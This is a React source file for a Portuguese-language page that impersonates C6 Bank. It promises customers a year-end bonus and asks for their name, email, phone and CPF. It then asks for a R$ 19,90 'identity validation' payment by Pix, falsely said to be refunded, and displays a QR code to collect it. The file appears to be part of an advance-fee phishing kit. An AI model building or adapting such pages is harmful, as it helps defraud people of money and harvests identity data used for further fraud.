import { useEffect, useState } from 'react';
import { PulseLoader } from 'react-spinners';
import { FooterOriginalC6 } from '../../components/FooterOriginalC6';
import { QrCodeStepOne, } from '../../components/QrCodeStepOne';
import api from '../../lib/api';

import InputMask from 'react-input-mask';

export function TransationBlackPay() {

  const [formData, setFormData] = useState({
    nome: '',
    email: '',
    telefone: '',
    cpf: '',
    produtoId: '',
  });
  const [qrCode, setQrCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [transactionId, setransactionId] = useState<string>('');
  const [showModal, setShowModal] = useState(false)

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const handleChange = (e: any) => {
    const { name, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [name]: value,
    }));
  };



  const validarFormulario = () => {
    if (!formData.nome.trim()) return 'O campo Nome é obrigatório.';
    if (
      !formData.email.trim() ||
      !/^[\w-]+@([\w-]+\.)+[\w-]{2,4}$/.test(formData.email)
    )
      return 'O campo E-mail está vazio ou inválido.';
    if (
      !formData.telefone.trim() ||
      !/^\d{10,11}$/.test(formData.telefone.replace(/[^\d]/g, ''))
    )
      return 'O campo Telefone está vazio ou inválido.';
    if (
      !formData.cpf.trim() ||
      !/^\d{11}$/.test(formData.cpf.replace(/[^\d]/g, ''))
    )
      return 'O campo CPF está vazio ou inválido.';
    return '';
  };

  const criarTransacao = async (e: any) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setQrCode('');

    const validationError = validarFormulario();
    if (validationError) {
      setError(validationError);
      setLoading(false);
      return;
    }

    try {
      const response = await api.post('/transactions/pix', {
        client: {
          name: formData.nome,
          email: formData.email,
          phone: formData.telefone,
          cpf: formData.cpf,
        },
      });

      const newTransactionId = response.data.transactionId;


      if (newTransactionId) {
        setransactionId(newTransactionId);
      } else {
        throw new Error('Transaction ID não foi retornado pela API.');
      }

      setQrCode(response.data.pix.code);
      setShowModal(true);
    } catch (err) {
      setError('Erro ao criar a transação. Tente novamente.');
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="pt-24 flex flex-col min-h-screen justify-between antialiased">
      {showModal && (
        <QrCodeStepOne
          idTransaction={transactionId}
          code={qrCode}
          onClose={() => setShowModal(false)} // Fecha o modal
        />
      )}


      <section className="px-6 mb-8">
        <h1 className="text-[1.4rem] bg-gradient-to-r from-gradient1 via-gradient3 to-gradient6 bg-clip-text text-transparent font-c6text-bold leading-9">
          Ficamos muito felizes que você chegou até aqui !
        </h1>
        <p className="text-[#f4f4f4] text-[0.90rem] pt-4">
          No C6 Bank, valorizamos cada momento do seu tempo e reconhecemos a
          importância da sua opinião para continuarmos melhorando nossos
          serviços. Em 2024, queremos celebrar junto com você! Como forma de
          retribuir o carinho e confiança ao longo deste ano, preparamos um
          bônus especial para tornar esse fim de ano ainda mais inesquecível.
          Obrigado por fazer parte da nossa história!
        </p>

        <p className="text-[#FBC161] font-c6display-regular pt-4 text-[0.80rem]">
          Solicitaremos apenas uma validação simbólica de identidade no valor de{' '}
          <b className="text-[#ffff]">R$ 19,90</b> que será integralmente{' '}
          <b className="uppercase text-[#fff] font-bold">reembolsada</b> em sua
          conta.
        </p>

        <h1 className="text-[#f4f4f4] text-[0.90rem] text-left flex items-start px-1 justify-start self-start pt-4 pb-4 font-bold">
          Identifique-se
        </h1>
        <form
          className="bg-[#242424] flex flex-col justify-center w-full px-4 rounded-lg gap-5 py-6"
          onSubmit={criarTransacao}
        >
          <input
            type="text"
            name="nome"
            className="custom-input bg-[#303030] text-white rounded-xl font-c6display-light font-light placeholder-white px-4 py-3 text-[0.90rem] border-[#3b3b3b] border outline-none focus:border-[#FBC161] focus:outline-none"
            value={formData.nome}
            onChange={handleChange}
            placeholder="Nome"
          />
          <input
            type="email"
            name="email"
            className="custom-input bg-[#303030] text-white rounded-xl font-c6display-light font-light placeholder-white px-4 py-3 text-[0.90rem] border-[#3b3b3b] border outline-none focus:border-[#FBC161] focus:outline-none"
            value={formData.email}
            onChange={handleChange}
            placeholder="E-mail"
          />
          <InputMask
            mask="(99) 99999-9999"
            value={formData.telefone}
            onChange={handleChange}
          >
            {() => (
              <input
                type="text"
                name="telefone"
                className="custom-input bg-[#303030] text-white rounded-xl font-c6display-light font-light placeholder-white px-4 py-3 text-[0.90rem] border-[#3b3b3b] border outline-none focus:border-[#FBC161] focus:outline-none"
                placeholder="Telefone"
              />
            )}
          </InputMask>
          <InputMask
            mask="999.999.999-99"
            value={formData.cpf}
            onChange={handleChange}
          >
            {() => (
              <input
                type="text"
                name="cpf"
                className="custom-input bg-[#303030] text-white rounded-xl font-c6display-light font-light placeholder-white px-4 py-3 text-[0.90rem] border-[#3b3b3b] border outline-none focus:border-[#FBC161] focus:outline-none"
                placeholder="CPF"
              />
            )}
          </InputMask>
          <button
            type="submit"
            className="bg-[#f4f4f4] flex items-center justify-center gap-2 py-[0.70rem] rounded-xl"
            disabled={loading}
          >
            {loading ? (
              <>
                <div>


                  <PulseLoader color="#000" size={10} />
                </div>

              </>
            ) : (
              'Gerar'
            )}
          </button>
        </form>
        {error && <p style={{ color: 'red', marginTop: '1rem' }}>{error}</p>}


      </section>
      <FooterOriginalC6 />
    </main>
  );
}
